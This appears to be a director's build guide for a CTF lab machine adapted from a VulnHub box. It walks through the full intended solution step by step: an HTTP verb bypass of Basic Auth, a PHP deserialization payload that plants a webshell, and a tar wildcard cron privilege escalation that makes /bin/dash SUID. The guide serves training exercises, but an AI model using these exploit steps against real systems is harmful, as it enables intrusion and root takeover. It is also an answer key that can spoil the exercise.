# AM-04: R&D Annex (Provisional) — Director Build Guide

> **EYES ONLY — DIRECTORS.** This document contains the full exploit
> chain. Do not distribute to players. Player-facing material is in
> `PLAYER_BRIEF.md`.

## Overview

| | |
|---|---|
| Difficulty | Medium |
| Source shape | VulnHub /dev/random: Pipe (entry 124, by Sagi-) — reskinned |
| Base image | `debian:11-slim` (PHP 7.4) |
| Services | HTTP (80, Apache+PHP, Basic Auth), SSH (2220, locked down), API (3000, Python) |
| Intended path | Verb bypass → PHP deserialization → webshell → tar wildcard cron privesc |
| CP | User 300, Root 400 |
| Flags | `DZ{user_rd_annex_<hash>}`, `DZ{root_rd_annex_<hash>}` (per-event) |
| Lore | Fragment D — QUORUM internal version (4.7.2) > public version (3.2.0) (THE OPTIMIZATION) |

---

## Build & Run

```bash
cd Anomaly_Machines/AM-04_rd_annex

# Mint per-event flags (from the Anomaly_Machines/ root):
cd ../ && ./generate_flags.sh && cd AM-04_rd_annex

# Set the flags as env vars:
export AM04_USER_FLAG="$(python3 -c "import json;print(json.load(open('../event_flags.json'))['AM-04: R&D Annex (Provisional) — User Flag'])")"
export AM04_ROOT_FLAG="$(python3 -c "import json;print(json.load(open('../event_flags.json'))['AM-04: R&D Annex (Provisional) — Root Flag'])")"

# Build and start (dev):
docker compose -f docker-compose.yml -f docker-compose.dev.yml up -d --build
docker compose logs -f
```

Dev port map:
- `8083:80` — HTTP (Basic Auth + verb bypass)
- `2224:2220` — SSH (locked-down decoy)
- `3000:3000` — R&D API (recon hint)

---

## Exploit Chain — Full Walkthrough

### Stage 1 — Enumerate

```bash
nmap -sV -sC localhost   # dev: ports 8083, 2224, 3000
# 80/tcp    open  http    Apache (401 Unauthorized)
# 2220/tcp  open  ssh     OpenSSH
# 3000/tcp  open  http    Python (R&D API)
```

### Stage 2 — HTTP Basic Auth + verb bypass

```bash
# Standard GET returns 401:
curl -s -o /dev/null -w '%{http_code}\n' http://localhost:8083/
# 401

# Non-standard verb bypasses auth:
curl -s -X BOB http://localhost:8083/index.php | head -20
# 200 — page renders with JS serialization hint and /scriptz/ reference
```

View the page source to find:
- `<script src="scriptz/php.js">` — JS serialize() implementation
- JS building `O:4:"Info":4:{...}` in the `param` POST field
- Hidden note: "QUORUM internal version: 3.2.0 (public-facing) | R&D systems report 4.7.2"

### Stage 3 — API on port 3000 (alternate recon)

```bash
curl http://localhost:3000/
# R&D Internal API status page:
#   QUORUM Core: 3.2.0 (public) vs 4.7.2 (internal) — DISCREPANCY
#   Diagnostic Tools at /scriptz/
#   Fragment D lore text
```

### Stage 4 — /scriptz/ directory listing + gadget discovery

```bash
# /scriptz/ is listable without auth (Satisfy any):
curl http://localhost:8083/scriptz/
# Directory listing shows:
#   php.js
#   log.php.BAK

# Read the gadget hint:
curl http://localhost:8083/scriptz/log.php.BAK
# Log class with __destruct() -> file_put_contents($filename, $data, FILE_APPEND)
```

### Stage 5 — PHP deserialization → webshell → RCE

Craft a serialized `Log` object that writes a PHP webshell:

```bash
# The payload (URL-encode for POST):
# O:3:"Log":2:{s:8:"filename";s:34:"/var/www/html/scriptz/dz_shell.php";s:4:"data";s:39:"<?php echo shell_exec($_GET['cmd']); ?>";}

# POST it using the bypass verb:
curl -X BOB --data-urlencode 'param=O:3:"Log":2:{s:8:"filename";s:34:"/var/www/html/scriptz/dz_shell.php";s:4:"data";s:39:"<?php echo shell_exec($_GET["cmd"]); ?>";}' \
  http://localhost:8083/index.php

# Trigger the webshell:
curl "http://localhost:8083/scriptz/dz_shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Stage 6 — User flag

```bash
curl "http://localhost:8083/scriptz/dz_shell.php?cmd=cat+/home/researcher/user.txt"
# DZ{user_rd_annex_<hash>}
```

### Stage 7 — Cron privesc discovery

```bash
curl "http://localhost:8083/scriptz/dz_shell.php?cmd=cat+/etc/cron.d/rd-backup"
# */5 * * * * root /usr/local/bin/rd_backup.sh
# * * * * *   root /root/create_backup.sh

curl "http://localhost:8083/scriptz/dz_shell.php?cmd=cat+/usr/local/bin/rd_backup.sh"
# #!/bin/sh
# rm -f /home/researcher/backup/backup.tar.gz
# cd /home/researcher/backup
# tar cfz /home/researcher/backup/backup.tar.gz *   ← wildcard vuln!
# chown researcher:researcher /home/researcher/backup/backup.tar.gz
# rm -f /home/researcher/backup/*.BAK
```

### Stage 8 — tar --checkpoint-action privesc → root

```bash
# Create the exploit files in the world-writable backup dir:
# (Use -G --data-urlencode so curl handles URL-encoding; inlining && in the
#  query string breaks because the shell running curl treats && as its own.)
curl -G --data-urlencode "cmd=cd /home/researcher/backup && echo > --checkpoint=1" \
  http://localhost:8083/scriptz/dz_shell.php
curl -G --data-urlencode "cmd=cd /home/researcher/backup && echo > '--checkpoint-action=exec=sh shell.sh'" \
  http://localhost:8083/scriptz/dz_shell.php
curl -G --data-urlencode "cmd=cd /home/researcher/backup && echo 'chmod u+s /bin/dash' > shell.sh" \
  http://localhost:8083/scriptz/dz_shell.php
curl -G --data-urlencode "cmd=cd /home/researcher/backup && chmod +x shell.sh" \
  http://localhost:8083/scriptz/dz_shell.php

# Wait up to 5 minutes for the cron job to fire:
sleep 300

# /bin/dash is now SUID:
curl -G --data-urlencode "cmd=ls -la /bin/dash" \
  http://localhost:8083/scriptz/dz_shell.php
# -rwsr-xr-x 1 root root ... /bin/dash

# Get a root shell and read the flag (note the -p flag — dash drops SUID
# privileges on startup unless -p is given, so without it /root/ is denied):
curl -G --data-urlencode "cmd=/bin/dash -p -c 'cat /root/root.txt'" \
  http://localhost:8083/scriptz/dz_shell.php
# DZ{root_rd_annex_<hash>}
```

### Stage 9 — Lore Fragment D (THE OPTIMIZATION)

The API on port 3000 reveals QUORUM's internal version (4.7.2) is higher
than the public-facing version (3.2.0). The page source also mentions
this discrepancy. This is Fragment D — THE OPTIMIZATION faction learns
QUORUM is hiding capabilities from citizens.

---

## Validation (automated)

```bash
cd Anomaly_Machines/AM-04_rd_annex
docker compose -f docker-compose.yml -f docker-compose.dev.yml --profile test up --build --abort-on-container-exit
```

---

## Reskinning notes (vs. source /dev/random: Pipe)

- Source: VulnHub entry 124 (NOT entry 448 — the AM_SOURCING.md was corrected)
- `rene` → `researcher`; `/home/rene/backup/` → `/home/researcher/backup/`
- `/usr/bin/compress.sh` → `/usr/local/bin/rd_backup.sh`
- ntopng/rpcbind dropped; Python API on 3000 added (recon hint + lore)
- SSH moved from 22 → 2220 (nonstandard, locked-down decoy)
- HTTP Basic Auth verb bypass preserved faithfully (`<Limit GET POST HEAD>`)
- PHP deserialization gadget (Log class) preserved faithfully
- tar `--checkpoint-action` wildcard privesc preserved faithfully
- Base image: `debian:11-slim` (source was Debian 8 Jessie)
- Lore Fragment D planted in the API + page source